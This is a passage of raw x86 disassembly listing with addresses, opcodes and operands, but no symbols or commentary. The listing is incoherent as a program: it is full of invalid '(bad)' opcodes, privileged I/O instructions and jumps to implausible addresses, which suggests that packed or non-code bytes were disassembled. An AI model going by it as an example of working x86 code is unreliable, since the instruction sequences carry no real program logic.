  403632:	sbb    DWORD PTR [edi+0x67f4782c],ecx
  403638:	gs xchg edi,edi
  40363b:	and    bl,0x8d
  40363e:	xor    eax,0x2e7ea234
  403643:	sub    eax,0x424bab51
  403648:	adc    ah,bl
  40364a:	dec    eax
  40364b:	pop    ebx
  40364c:	pop    es
  40364d:	push   ebx
  40364e:	loope  0x403667
  403650:	mov    esi,0x7510e241
  403655:	lock (bad) 
  403657:	in     eax,0x2b
  403659:	pop    ds
  40365a:	hlt    
  40365b:	(bad)  
  40365c:	fiadd  DWORD PTR [ebx]
  40365e:	ins    BYTE PTR es:[edi],dx
  40365f:	jnp    0x4035fb
  403661:	hlt    
  403662:	jbe    0x4036c8
  403664:	add    BYTE PTR [ecx-0x27],bl
  403667:	outs   dx,BYTE PTR ds:[esi]
  403668:	mov    ebx,DWORD PTR [eax]
  40366a:	and    bh,BYTE PTR [eax-0x6e]
  40366d:	(bad)  
  40366e:	cmp    bh,BYTE PTR [eax-0x5253c923]
  403674:	les    edi,FWORD PTR [ebp-0x33]
  403677:	ret    0xb4ef
  40367a:	jle    0x403657
  40367c:	not    al
	...
  403696:	add    BYTE PTR [ebp+eax*1-0x52],dh
  40369a:	xchg   ecx,eax
  40369b:	jnp    0x4036bd
  40369d:	mov    bh,0x42
  40369f:	push   esi
  4036a0:	repz fwait
  4036a2:	add    eax,DWORD PTR [ebp-0x106b7b16]
  4036a8:	sub    edx,ecx
  4036aa:	dec    ebp
  4036ab:	mov    eax,0x106d334
  4036b0:	pusha  
  4036b1:	clc    
  4036b2:	mov    edi,0x88e14709
  4036b7:	push   cs
  4036b8:	fbld   TBYTE PTR [esi+0x49]
  4036bb:	std    
  4036bc:	(bad)  
  4036bd:	jg     0x4036c9
  4036bf:	pushf  
  4036c0:	lods   al,BYTE PTR ds:[esi]
  4036c1:	push   esp
  4036c2:	retf   
  4036c3:	shl    BYTE PTR [ecx+0x77a94c4d],cl
  4036c9:	add    al,BYTE PTR [ebp-0x31e4914e]
  4036cf:	xchg   BYTE PTR [ecx-0x63aff8d0],al
  4036d5:	sub    DWORD PTR [ecx+0x40e4c246],eax
  4036db:	xchg   ebp,eax
  4036dc:	(bad)  
  4036de:	repz mov bl,0xb8
  4036e1:	(bad)  
  4036e2:	mov    dl,0x7a
  4036e4:	lods   eax,DWORD PTR ds:[esi]
  4036e5:	iret   
  4036e6:	gs loope 0x403756
  4036e9:	sbb    BYTE PTR [edx+ecx*2],0x77
  4036ed:	cdq    
  4036ee:	xlat   BYTE PTR ds:[ebx]
  4036ef:	out    dx,al
  4036f0:	fwait
  4036f1:	mov    dl,0x8e
  4036f3:	lahf   
  4036f4:	mov    BYTE PTR [ebx+0x1baccd00],ch
  4036fa:	sub    al,0x0
	...
  403714:	mov    WORD PTR [ebx],ss
  403716:	pop    es
  403717:	xor    eax,0x1e2a4e3f
  40371c:	(bad)  
  40371d:	cld    
  40371e:	xor    BYTE PTR [edi],al
  403720:	xchg   ecx,eax
  403721:	addr16 jo 0x40376c
  403724:	inc    eax
  403725:	fsubr  DWORD PTR [ebx+0x51]
  403728:	add    eax,DWORD PTR [edx+0x32c27a46]
  40372e:	pop    ebp
  40372f:	arpl   WORD PTR [ebx],cx
  403731:	fdivp  st(2),st
  403733:	retf   
  403734:	pop    edx
  403735:	outs   dx,BYTE PTR ds:[esi]
  403736:	loope  0x40370a
  403738:	cdq    
  403739:	xor    ecx,esp
  40373b:	stc    
  40373c:	cwde   
  40373d:	adc    edi,0xffffffe0
  403740:	out    0x12,eax
  403742:	xchg   esi,eax
  403743:	scas   eax,DWORD PTR es:[edi]
  403744:	mov    eax,es:0xf855b68c
  40374a:	lahf   
  40374b:	popf   
  40374c:	xchg   esp,eax
  40374d:	inc    esi
  40374e:	mov    ebx,0x235be384
  403753:	add    edx,DWORD PTR [edx]
  403755:	in     al,dx
  403756:	aaa    
  403757:	sbb    dl,BYTE PTR [ecx+0x5]
  40375a:	adc    eax,0xe159031
  40375f:	sub    BYTE PTR [edi-0x2198b061],bl
  403765:	cs push esp
  403767:	jle    0x403776
  403769:	jp     0x4037e4
  40376b:	push   ebp
  40376c:	dec    esp
  40376d:	leave  
  40376e:	bound  ecx,QWORD PTR [edx+ebx*8-0x3e]
  403772:	cmp    BYTE PTR [ecx-0x67dc8c95],al
	...
  403790:	add    BYTE PTR [eax],ch
  403792:	sub    eax,0x9de9b30e
  403797:	adc    eax,0x5400f6aa
  40379c:	in     eax,0xb7
  40379e:	mov    dh,0x4e
  4037a0:	cld    
  4037a1:	hlt    
  4037a2:	xor    al,0x25
  4037a4:	(bad)
  4037a9:	ret    0x50da
  4037ac:	loope  0x4037eb
  4037ae:	xchg   esp,eax
  4037af:	inc    ecx
  4037b0:	cli    
  4037b1:	and    al,0x59
  4037b3:	out    dx,al
  4037b4:	(bad)  
  4037b5:	call   DWORD PTR [ecx]
  4037b7:	pop    ds
  4037b8:	int3   
  4037b9:	(bad)  
  4037ba:	mov    esi,0x198d89
  4037bf:	jnp    0x403757
  4037c1:	sub    BYTE PTR ds:0x7dfbbbac,bh
  4037c7:	frstor [eax+0x7eb3d1fa]
  4037cd:	stos   BYTE PTR es:[edi],al
  4037ce:	mov    dl,al
  4037d0:	gs mov ebx,0xc8489543
  4037d6:	mov    edx,0x95a95363
  4037db:	not    BYTE PTR [ecx]
  4037dd:	out    dx,al
  4037de:	push   esp
  4037df:	pop    es
  4037e0:	or     edi,edx
  4037e2:	pop    es
  4037e3:	pop    eax
  4037e4:	and    al,0xec
  4037e6:	(bad)  
  4037e7:	sub    BYTE PTR [edi],bh
  4037e9:	in     eax,0x89
  4037eb:	cmp    eax,0x4c4062a7
  4037f0:	mov    esp,0x911b0b73
	...
  40380d:	add    BYTE PTR [eax-0x3e],dl
  403810:	jmp    0x808ce99e
  403815:	retf   
  403816:	out    0x8d,al
  403818:	xchg   ecx,eax
  403819:	ror    bh,1
  40381b:	into   
  40381c:	(bad)  
  40381e:	mov    ah,0xf
  403820:	scas   eax,DWORD PTR es:[edi]
  403821:	out    0xad,al
  403823:	and    DWORD PTR [ebp-0x2c081f44],0x82b2f1a7
  40382d:	mov    dl,BYTE PTR [edx]
  40382f:	push   0x71
  403831:	xchg   ecx,eax
  403832:	repz add al,0x60
  403835:	call   0x19616df5
  40383a:	scas   eax,DWORD PTR es:[edi]
  40383b:	sub    al,0xd2
  40383d:	inc    ebp
  40383e:	xchg   edx,eax
  40383f:	inc    edi
  403840:	xchg   ebx,eax
  403841:	ss xchg ecx,eax
  403843:	pop    esi
  403844:	cmp    al,0x2b
  403846:	adc    ecx,ebx
  403848:	cmc    
  403849:	pop    ecx
  40384a:	add    al,al
  40384c:	mov    esi,0x77ab270c
  403851:	sti    
  403852:	mov    ebx,0xfd6d98b1
  403857:	jl     0x403832
  403859:	sahf   
  40385a:	push   es
  40385b:	fs sbb dl,al
  40385e:	sbb    ecx,DWORD PTR [edi-0x69e73ea5]
  403864:	jmp    0xf6452c6c
  403869:	sub    DWORD PTR [esi],esi
  40386b:	add    al,0x47
  40386d:	fdiv   DWORD PTR [eax+0x6]
  403870:	adc    BYTE PTR [esi+0x0],bh
	...
  40388b:	mov    edx,0xfd6bc506
  403890:	add    DWORD PTR [edx+0x5b032fc1],edx
  403896:	aas    
  403897:	imul   eax,DWORD PTR [ecx],0xffc31564
  40389d:	inc    eax
  40389e:	push   esp
  40389f:	out    0xa,eax
  4038a1:	outs   dx,BYTE PTR ds:[esi]
  4038a2:	cli    
  4038a3:	and    al,0xa
  4038a5:	lahf   
  4038a6:	mov    BYTE PTR [ebx+0x8],ah
  4038a9:	mov    BYTE PTR [esi-0x4332f6b7],ch
  4038af:	push   cs
  4038b0:	or     al,0xba
  4038b2:	xchg   edx,eax
  4038b3:	mov    esp,0x79f0e30c
  4038b8:	push   cs
  4038b9:	or     al,0x47
  4038bb:	xor    BYTE PTR [esi],cl
  4038bd:	mov    ecx,0xa6191262
  4038c2:	int3   
  4038c3:	fcom   DWORD PTR [edi]
  4038c5:	add    bh,dl
  4038c7:	add    ah,BYTE PTR [edi+0x1f]
  4038ca:	add    ch,dl
  4038cc:	and    al,0x1e
  4038ce:	push   ebp
  4038cf:	(bad)  
  4038d0:	jmp    0xa818baef
  4038d5:	sbb    ch,BYTE PTR [ebx]
  4038d7:	mov    edx,0xc14186d
  4038dc:	sub    al,0x19
  4038de:	xor    DWORD PTR [ebp-0x11],eax
  4038e1:	adc    esi,edi
  4038e3:	pop    esi
  4038e4:	mov    cl,0x13
  4038e6:	dec    edi
  4038e7:	xchg   ecx,eax
  4038e8:	je     0x4038fb
  4038ea:	pop    eax
  4038eb:	ret    
  4038ec:	xor    eax,0xfd10
	...
  403905:	add    BYTE PTR [eax],al
  403907:	add    ch,cl
  403909:	clc    
  40390a:	adc    al,0xa
  40390c:	push   0x6a5314b7
  403911:	jl     0x403929
  403913:	sbb    al,0x9c
  403915:	ds pop ss
  403917:	leave  
  403918:	mov    dl,0x47
  40391a:	cmp    BYTE PTR [esi+0x67398a44],dl
  403920:	retfw  
  403922:	cmp    esi,DWORD PTR [eax+0x70]
  403925:	or     eax,0x4059e53a
  40392a:	aas    
  40392b:	bnd jnp 0x4038b0
  40392e:	cmp    ebx,DWORD PTR ds:[esi]
  403931:	jns    0x40396f
  403933:	add    al,0xa8
  403935:	push   es
  403936:	cmp    eax,0x365ae121
  40393b:	push   cs
  40393c:	ret    
  40393d:	cwde   
  40393e:	aaa    
  40393f:	mov    edi,0xe835de34
  403944:	pop    esi
  403945:	sbb    eax,0x50696d34
  40394a:	xor    DWORD PTR [edx+0x433092cb],ebx
  403950:	or     eax,0xf72c32d4
  403955:	adc    eax,0x602d0033
  40395a:	imul   esp,DWORD PTR [edx+edi*2],0xffffff8a
  40395e:	test   eax,0xeeb40325
  403963:	daa    
  403964:	aam    0x5d
  403966:	sub    eax,0x62476126
  40396b:	and    eax,DWORD PTR [eax]
	...
  403985:	push   esi
  403986:	mov    eax,ds:0x9baf229f
  40398b:	out    0x20,al
  40398d:	mov    BYTE PTR [ebp+0x24],dh
  403990:	and    DWORD PTR [ebp-0x5dd587d0],esp
  403996:	fidivr DWORD PTR [edx-0x41bb4d5]
  40399c:	sub    esp,ebp
  40399e:	or     eax,0x1849283e
  4039a3:	jno    0x4039d2
  4039a5:	mov    ?,edx
  4039a7:	mov    dl,0x2c
  4039a9:	out    0xcb,eax
  4039ab:	cmc    
  4039ac:	shl    BYTE PTR cs:0x879d2f37,1
  4039b3:	call   0x7371:0x58618a70
  4039ba:	pop    ebx
  4039bb:	push   ds
  4039bc:	jae    0x403982
  4039be:	mov    ah,0xdb
  4039c0:	jb     0x4039b3
  4039c2:	lahf   
  4039c3:	xchg   edx,eax
  4039c4:	ja     0x403a0c
  4039c6:	dec    ecx
  4039c7:	push   ecx
  4039c8:	jbe    0x4039c9
  4039ca:	jae    0x4039e3
  4039cc:	je     0x4039a6
  4039ce:	popf   
  4039cf:	aad    0x75
  4039d1:	cmc    
  4039d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d3:	mov    DWORD PTR [esi-0x2e],edi
  4039d6:	cs dec ebx
  4039d8:	jg     0x4039f5
  4039da:	or     al,0xd
  4039dc:	jge    0x40399a
  4039de:	in     eax,0xce
  4039e0:	jl     0x403a5b
  4039e2:	out    dx,eax
  4039e3:	jg     0x403a5e
  4039e5:	pop    esi
  4039e6:	sbb    al,BYTE PTR [edx+0x78]
	...
  403a01:	add    ah,dh
  403a03:	jecxz  0x403a67
  403a05:	add    al,0x4e
  403a07:	dec    ecx
  403a08:	leave  
  403a09:	(bad)  
  403a0a:	dec    edi
  403a0b:	ds in  eax,dx
  403a0d:	mov    ebx,0x7e471f50
  403a12:	dec    ecx
  403a13:	adc    BYTE PTR [ecx-0x6cbadcc8],bh
  403a19:	cli    
  403a1a:	sbb    dl,BYTE PTR [edx-0x3cf04a7b]
  403a20:	scas   eax,DWORD PTR es:[edi]
  403a21:	ja     0x403a31
  403a23:	lods   al,BYTE PTR ds:[esi]
  403a24:	push   ecx
  403a25:	xor    DWORD PTR [ecx+edx*8],ebx
  403a28:	sti    
  403a29:	repnz sbb eax,0x16af3cb6
  403a2f:	ja     0x403a47
  403a31:	ins    DWORD PTR es:[edi],dx
  403a32:	pop    ss
  403a33:	mov    BYTE PTR [eax+0x2b],ch
  403a36:	aad    0x9c
  403a38:	ret    0xd4e9
  403a3b:	jns    0x403a10
  403a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a3e:	fxch   st(2)
  403a40:	jns    0x403aa6
  403a42:	rcl    BYTE PTR [ebx+0x58da2207],1
  403a48:	sub    eax,0xcf0dd3e0
  403a4d:	xlat   BYTE PTR ds:[ebx]
  403a4e:	lods   al,BYTE PTR ds:[esi]
  403a4f:	into   
  403a50:	fs adc eax,0x531adfad
  403a56:	mov    edi,0xbe9130f4
  403a5b:	popa   
  403a5c:	daa    
  403a5d:	fidiv  WORD PTR [ebx-0x55e3f28e]
  403a63:	cmp    esi,DWORD PTR [ebx+0x5a]
	...
  403a7e:	add    al,al
  403a80:	inc    eax
  403a81:	fstp   DWORD PTR [eax-0x3b61da47]
  403a87:	mov    edx,0xb306b446
  403a8c:	aaa    
  403a8d:	dec    edx
  403a8e:	inc    eax
  403a8f:	cmp    DWORD PTR [ebp-0x20],ebp
  403a92:	xor    DWORD PTR [eax],0xb0f5ad05
  403a98:	inc    esp
  403a99:	ficomp DWORD PTR [ebx-0x15]
  403a9c:	inc    esp
  403a9d:	add    esp,DWORD PTR [edx-0x7813bcc3]
  403aa3:	jg     0x403ae7
  403aa5:	cdq    
  403aa6:	sub    eax,ebp
  403aa8:	push   ecx
  403aa9:	mov    BYTE PTR ds:0x77f75007,0x29
  403ab0:	dec    esi
  403ab1:	loopne 0x403a84
  403ab3:	arpl   WORD PTR [edi+0x75],cx
  403ab6:	les    ebx,FWORD PTR [edx+edx*2+0x52de6e62]
  403abd:	or     edx,DWORD PTR [eax]
  403abf:	adc    BYTE PTR [ebp+0x34],dl
  403ac2:	cmp    cl,BYTE PTR [edx+0x54]
  403ac5:	adc    ebp,edi
  403ac7:	xchg   ebp,eax
  403ac8:	pop    ebx
  403ac9:	push   ds
  403aca:	push   edi
  403acb:	aam    0x59
  403acd:	outs   dx,DWORD PTR ds:[esi]
  403ace:	test   eax,0x83385bda
  403ad3:	nop
  403ad4:	pop    ebp
  403ad5:	sbb    eax,0xea584f95
  403ada:	mov    esi,0x4133590d
  403adf:	jecxz  0x403b37
  403ae1:	cmp    al,0xeb
	...
  403afb:	add    BYTE PTR [eax+0x91e6956],bl
  403b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b02:	jbe    0x403b38
  403b04:	inc    ebx
  403b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b06:	(bad)  
  403b07:	retf   0xa365
  403b0a:	nop
  403b0b:	pusha  
  403b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b0d:	mov    eax,ds:0x9ee07745
  403b12:	adc    bl,ch
  403b14:	sbb    bl,BYTE PTR [esi-0x5fb3dd25]
  403b1a:	in     al,0x8
  403b1c:	mov    fs,WORD PTR [eax-0x5a25b23f]
  403b22:	out    dx,al
  403b23:	jecxz  0x403b3c
  403b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b26:	add    BYTE PTR [edi],bl
  403b28:	mov    fs,WORD PTR [edx-0x14]
  403b2b:	or     BYTE PTR [esp-0x1a66b213],ah
  403b32:	out    0x3a,eax
  403b34:	outs   dx,DWORD PTR ds:[esi]
  403b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b36:	jmp    0xebab009e
  403b3b:	mov    WORD PTR [ebx],fs
  403b3d:	sub    al,0xea
  403b3f:	cmp    DWORD PTR [edi],edi
  403b41:	adc    bh,ch
  403b43:	mov    eax,es:0xdb57fcd3
  403b49:	(bad)  
  403b4a:	inc    BYTE PTR [eax-0x2a00b00b]
  403b50:	pop    es
  403b51:	sbb    edi,edx
  403b53:	add    bl,dl
  403b55:	fdiv   st(3),st
  403b57:	stos   DWORD PTR es:[edi],eax
  403b58:	push   ebx
  403b59:	xchg   esi,eax
  403b5a:	stc    
  403b5b:	xchg   esp,eax
  403b5c:	sbb    eax,0xb1f859
	...
  403b79:	push   eax
  403b7a:	add    al,0xf3
  403b7c:	jle    0x403bf0
  403b7e:	ret    0xcff2
  403b81:	ins    BYTE PTR es:[edi],dx
  403b82:	xor    eax,0xf13ec6d8
  403b88:	jge    0x403b41
  403b8a:	or     esi,esp
  403b8c:	mov    cl,BYTE PTR [ecx-0x36]
  403b8f:	cmc    
  403b90:	rol    DWORD PTR [ebx-0x72630879],cl
  403b96:	inc    ebp
  403b97:	test   BYTE PTR [ecx-0x55],0x3c
  403b9b:	fst    DWORD PTR [esi]
  403b9d:	inc    ebp
  403b9e:	jnp    0x403b78
  403ba0:	out    0x7e,eax
  403ba2:	mov    eax,0xf650f0da
  403ba7:	fisub  DWORD PTR [ebp+0x53]
  403baa:	xor    ebx,esi
  403bac:	jb     0x403c2b
  403bae:	jno    0x403b8f
  403bb0:	mov    ebx,0x84ddb017
  403bb5:	mov    ecx,0x5500dbed
  403bba:	or     al,0x6b
  403bbc:	xlat   BYTE PTR ds:[ebx]
  403bbd:	push   0xffffffe2
  403bbf:	test   al,0xd6
  403bc1:	xor    edx,ecx
  403bc3:	out    dx,eax
  403bc4:	aam    0x5c
  403bc6:	cmp    ebp,DWORD PTR ds:0x6254d1d5
  403bcc:	sar    dh,1
  403bce:	mov    esi,0xf8b7d1a0
  403bd3:	in     eax,0xd3
  403bd5:	cwde   
  403bd6:	adc    ah,BYTE PTR [edx+edx*8]
  403bd9:	popf   
  403bda:	outs   dx,BYTE PTR ds:[esi]
  403bdb:	pop    esi
  403bdc:	lds    eax,FWORD PTR [eax]
	...
  403bf6:	repnz xchg esp,eax
  403bf8:	pushf  
  403bf9:	les    ebp,FWORD PTR [ebx-0x5e]
  403bfc:	fld    st(6)
  403bfe:	push   esp
  403bff:	dec    eax
  403c00:	sbb    bh,al
  403c02:	jmp    0xd702935d
  403c07:	lods   al,BYTE PTR ds:[esi]
  403c08:	xchg   esp,eax
  403c09:	ret    
  403c0a:	aas    
  403c0b:	mov    edx,ebx
  403c0d:	rol    DWORD PTR [eax],0x61
  403c10:	adc    eax,eax
  403c12:	and    eax,0x1acb4d1e
  403c17:	je     0x403ba8
  403c19:	retf   0xf223
  403c1c:	enter  0x6cc8,0x17
  403c20:	or     ecx,ecx
  403c22:	rol    DWORD PTR ds:0xec0ecc44,0x85
  403c29:	int    0x47
  403c2b:	fld    st(0)
  403c2d:	iret   
  403c2e:	dec    eax
  403c2f:	das    
  403c30:	add    cl,dh
  403c32:	or     eax,0x291af97
  403c37:	ins    DWORD PTR es:[edi],dx
  403c38:	ins    DWORD PTR es:[edi],dx
  403c39:	nop
  403c3a:	sti    
  403c3b:	dec    edx
  403c3c:	sub    edx,DWORD PTR [edx-0x6c175fbc]
  403c42:	jns    0x403bf2
  403c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c45:	xchg   esi,eax
  403c46:	mov    BYTE PTR [ebx+0x64],0x97
  403c4a:	hlt    
  403c4b:	(bad)  
  403c4c:	lods   eax,DWORD PTR ds:[esi]
  403c4d:	and    ah,BYTE PTR [ecx+0x69]
  403c50:	and    eax,0x68
  403c53:	xchg   al,al
  403c55:	mov    esp,0x7e66635b
	...
  403c72:	add    BYTE PTR [edx-0x77c7ebad],dl
  403c78:	cmp    al,0x3a
  403c7a:	cli    
  403c7b:	add    DWORD PTR [ecx],0xae7cb529
  403c81:	(bad)  
  403c82:	jbe    0x403cf1
  403c84:	addr16 jl 0x403cb8
  403c87:	outs   dx,DWORD PTR ds:[esi]
  403c88:	rcl    dl,0xf3
  403c8b:	pop    esi
  403c8c:	lods   eax,DWORD PTR ds:[esi]
  403c8d:	out    dx,al
  403c8e:	mov    BYTE PTR [ecx-0x56],ch
  403c91:	pop    eax
  403c92:	dec    ebx
  403c93:	sbb    BYTE PTR [ebx-0x3b85f25e],0x8c
  403c9a:	iret   
  403c9b:	jae    0x403cb6
  403c9d:	xchg   esi,eax
  403c9e:	sub    BYTE PTR [esi+0x46],0xb0
  403ca2:	inc    edx
  403ca3:	jg     0x403cc4
  403ca5:	dec    edx
  403ca6:	add    al,0x7d
  403ca8:	pop    eax
  403ca9:	in     al,0xc5
  403cab:	ins    BYTE PTR es:[edi],dx
  403cac:	xor    eax,0xf2779a1f
  403cb1:	or     BYTE PTR [eax+0x76],bl
  403cb4:	add    esi,DWORD PTR [ebx+0x1e]
  403cb7:	je     0x403cc5
  403cb9:	fstp   st(4)
  403cbb:	jne    0x403cae
  403cbd:	(bad)  
  403cbe:	xchg   ebx,eax
  403cbf:	jo     0x403cff
  403cc1:	pop    esi
  403cc2:	push   ecx
  403cc3:	jns    0x403cdc
  403cc5:	sbb    al,0x17
  403cc7:	jae    0x403c99
  403cc9:	xor    ebp,edx
  403ccb:	jp     0x403d4a
  403ccd:	aam    0xe2
  403ccf:	lea    ebx,[edx+0x7a]
  403cd2:	and    BYTE PTR [ebx+ebp*2+0x0],bl
  403cd6:	data16 add BYTE PTR [eax],al
	...
  403ced:	add    BYTE PTR [eax],al
  403cef:	add    BYTE PTR [esi+0x74],bl
  403cf2:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403cf4:	dec    edi
  403cf5:	add    al,0x25
  403cf7:	cmp    al,0xf
  403cf9:	bound  esi,QWORD PTR [edx]
  403cfb:	adc    bl,ch
  403cfd:	arpl   bx,di
  403cff:	addr16 fwait
  403d01:	popa   
  403d02:	les    edi,FWORD PTR [ebp-0x7b1e9faf]
  403d08:	add    eax,0x27aace6b
  403d0d:	imul   edi,edi,0x50
  403d10:	popa   
  403d11:	imul   ebp,DWORD PTR [eax],0x2d68aaf7
  403d17:	in     eax,dx
  403d18:	jecxz  0x403d7f
  403d1a:	pop    edx
  403d1b:	inc    ebx
  403d1c:	push   cs
  403d1d:	cmp    DWORD PTR fs:[ecx-0x709399b8],0xffffff82
  403d25:	sbb    DWORD PTR [bp+di],esi
  403d28:	mov    al,0x78
  403d2a:	inc    esi
  403d2b:	sbb    eax,0x5f7778fa
  403d30:	xor    al,0x7b
  403d32:	pusha  
  403d33:	leave  
  403d34:	jbe    0x403db0
  403d36:	cmc    
  403d37:	fisubr DWORD PTR [ecx+0x374e277]
  403d3d:	jbe    0x403cca
  403d3f:	push   es
  403d40:	cmp    eax,0x6f20b474
  403d45:	jne    0x403cd8
  403d47:	loope  0x403ceb
  403d49:	outs   dx,BYTE PTR ds:[esi]
  403d4a:	sahf   
  403d4b:	dec    ebx
  403d4c:	or     DWORD PTR [edi-0x11],ebp
  403d4f:	lods   eax,DWORD PTR ds:[esi]
  403d50:	(bad)  
  403d51:	ins    BYTE PTR es:[edi],dx
  403d52:	mov    eax,0x97
	...
  403d6b:	add    BYTE PTR [eax],al
  403d6d:	test   DWORD PTR [ebp+ebx*4-0x77],ebp
  403d71:	cmp    dh,BYTE PTR [ecx+0x6a]
  403d74:	mov    ds:0x55b36ff0,eax
  403d79:	scas   al,BYTE PTR es:[edi]
  403d7a:	jno    0x403d38
  403d7c:	out    dx,eax
  403d7d:	imul   esi,DWORD PTR [ebx-0x17],0x3
  403d81:	hlt    
  403d82:	add    al,0x44
  403d84:	pop    ds
  403d85:	jo     0x403df4
  403d87:	add    BYTE PTR [edx+0x3f],ah
  403d8a:	cld    
  403d8b:	test   eax,0x12779abf
  403d90:	imul   esp,DWORD PTR ds:[edi],0xffffff8f
  403d94:	fild   DWORD PTR [edi-0x2d]
  403d97:	aaa    
  403d98:	mov    ch,0xa2
  403d9a:	sbb    eax,0xdaff5025
  403d9f:	popf   
  403da0:	xchg   esi,eax
  403da1:	pcmpeqd mm0,mm5
  403da4:	jae    0x403de0
  403da6:	std    
  403da7:	jl     0x403db6
  403da9:	nop
  403daa:	outs   dx,DWORD PTR ds:[esi]
  403dab:	outs   dx,DWORD PTR ds:[esi]
  403dac:	call   0xa2174213
  403db1:	(bad)  
  403db2:	fisttp DWORD PTR [edx+0x3c]
  403db5:	scas   eax,DWORD PTR es:[edi]
  403db6:	push   ds
  403db7:	repnz sbb bl,BYTE PTR [ebx]
  403dba:	shl    al,cl
  403dbc:	mov    bh,0xe7
  403dbe:	and    eax,0xc2a6658
  403dc3:	push   eax
  403dc4:	inc    ebx
  403dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dc6:	push   0x1482dde8
  403dcb:	cli    
  403dcc:	mov    eax,0x3142605f
	...
  403de9:	add    BYTE PTR [edi+0x324cdf2d],dh
  403def:	retf   0xaa67
  403df2:	push   DWORD PTR [esi]
  403df4:	jne    0x403dbd
  403df6:	fcmovb st,st(2)
  403df8:	int    0x79
  403dfa:	ret    0x955f
  403dfd:	aam    0xf
  403dff:	adc    al,0x2d
  403e01:	repnz fldcw WORD PTR [eax+0x3f]
  403e05:	dec    edi
  403e06:	inc    edi
  403e07:	or     al,0x87
  403e09:	push   cs
  403e0a:	mov    cl,al
  403e0c:	sbb    ch,BYTE PTR [ebx]
  403e0e:	jns    0x403e45
  403e10:	mov    ds:0xb0c75085,al
  403e15:	mov    al,ds:0x82f01
  403e1a:	repz daa 
  403e1c:	xor    ah,BYTE PTR [eax+0x188ec0d6]
  403e22:	test   al,0xf
  403e24:	cmp    ecx,DWORD PTR [edx]
  403e26:	jge    0x403e30
  403e28:	xchg   DWORD PTR [edx+0x2f4fb104],esi
  403e2e:	and    DWORD PTR [eax-0x14],ebx
  403e31:	xchg   edi,eax
  403e32:	jg     0x403eac
  403e34:	pop    ecx
  403e35:	test   DWORD PTR [edx+0x5c3de57f],ebx
  403e3b:	das    
  403e3c:	xchg   BYTE PTR [ebp+0x29],ah
  403e3f:	imul   edi,DWORD PTR [edx],0x8f4a07dd
  403e45:	iret   
  403e46:	xchg   edx,eax
  403e47:	pushf  
  403e48:	xor    dh,BYTE PTR [edi+0x4b]
  403e4b:	sbb    esp,esp
  403e4d:	jmp    0x0:0x0
	...
  403e64:	add    BYTE PTR [eax],al
  403e66:	add    BYTE PTR [esi],bh
  403e68:	loop   0x403ec1
  403e6a:	push   edx
  403e6b:	ror    ah,1
  403e6d:	in     eax,dx
  403e6e:	inc    eax
  403e6f:	mov    ch,0x39
  403e71:	push   ecx
  403e72:	clc    
  403e73:	ins    BYTE PTR es:[edi],dx
  403e74:	jno    0x403ea1
  403e76:	lock fstp DWORD PTR [ecx-0x4708b769]
  403e7d:	and    DWORD PTR [edx-0x7e],ebx
  403e80:	inc    ecx
  403e81:	sahf   
  403e82:	loop   0x403e7f
  403e84:	jmp    0x14ebdd1
  403e89:	cmc    
  403e8a:	(bad)  
  403e8b:	pusha  
  403e8c:	push   ecx
  403e8d:	inc    eax
  403e8e:	aad    0x85
  403e90:	(bad)  
  403e91:	cld    
  403e92:	ins    DWORD PTR es:[edi],dx
  403e93:	inc    ebx
  403e94:	aam    0x9f
  403e96:	xor    eax,0x8d232146
  403e9b:	sbb    BYTE PTR [ecx],dl
  403e9d:	xchg   esi,eax
  403e9e:	lahf   
  403e9f:	lods   eax,DWORD PTR ds:[esi]
  403ea0:	stc    
  403ea1:	sub    DWORD PTR [edi],esp
  403ea3:	hlt    
  403ea4:	icebp  
  403ea5:	cld    
  403ea6:	mov    edx,0x240a8b1
  403eab:	hlt    
  403eac:	sub    eax,DWORD PTR [esp+esi*8+0x48abd6e4]
  403eb3:	mov    WORD PTR [ecx],cs
  403eb5:	pop    esp
  403eb6:	adc    al,0x8f
  403eb8:	out    0xf4,al
  403eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebb:	xlat   BYTE PTR ds:[ebx]
  403ebc:	das    
  403ebd:	xchg   ebx,eax
  403ebe:	sbb    eax,0xa1ac8ae5
  403ec3:	ins    DWORD PTR es:[edi],dx
  403ec4:	adc    al,0xc5
  403ec6:	jbe    0x403eb0
  403ec8:	sahf   
  403ec9:	imul   ecx,edx,0x0
	...
  403ee4:	pop    eax
  403ee5:	jge    0x403ee3
  403ee7:	jle    0x403f2b
  403ee9:	sub    ah,BYTE PTR [ebx]
  403eeb:	ret    
  403eec:	repnz mov esi,DWORD PTR [ebx]
  403eef:	mov    al,ds:0x1c0bf752
  403ef4:	rcl    BYTE PTR [esp+edi*2],cl
  403ef7:	test   eax,0x15d461e8
  403efc:	sub    BYTE PTR [ecx],ah
  403efe:	pushf  
  403eff:	ret    0x3da5
  403f02:	cmp    DWORD PTR [esi+0x5d],0xffffffa8
  403f06:	in     al,0xca
  403f08:	aas    
  403f09:	ret    
  403f0a:	dec    ebx
  403f0b:	ja     0x403ec4
  403f0d:	jnp    0x403f13
  403f0f:	or     eax,0xb12ae6bf
  403f14:	daa    
  403f15:	add    eax,0x921504bd
  403f1a:	arpl   WORD PTR [eax+0x6f9b10bd],di
  403f20:	cmp    BYTE PTR [esi],ch
  403f22:	mov    ah,0xd3
  403f24:	mov    BYTE PTR [edi-0x4d6d99ad],dl
  403f2a:	in     al,dx
  403f2b:	fldenv [edx]
  403f2d:	jns    0x403f0b
  403f2f:	mov    eax,0x543d602
  403f34:	mov    ds:0x98b0a3df,al
  403f39:	cmp    cl,BYTE PTR [ebx+0x304f80c]
  403f3f:	je     0x403f70
  403f41:	test   DWORD PTR [esi-0x25],ebx
  403f44:	shr    ebp,cl
  403f46:	ja     0x403f74
	...
  403f60:	add    BYTE PTR [esi],ah
  403f62:	fcmovnbe st,st(4)
  403f64:	adc    ecx,edx
  403f66:	xchg   ebx,eax
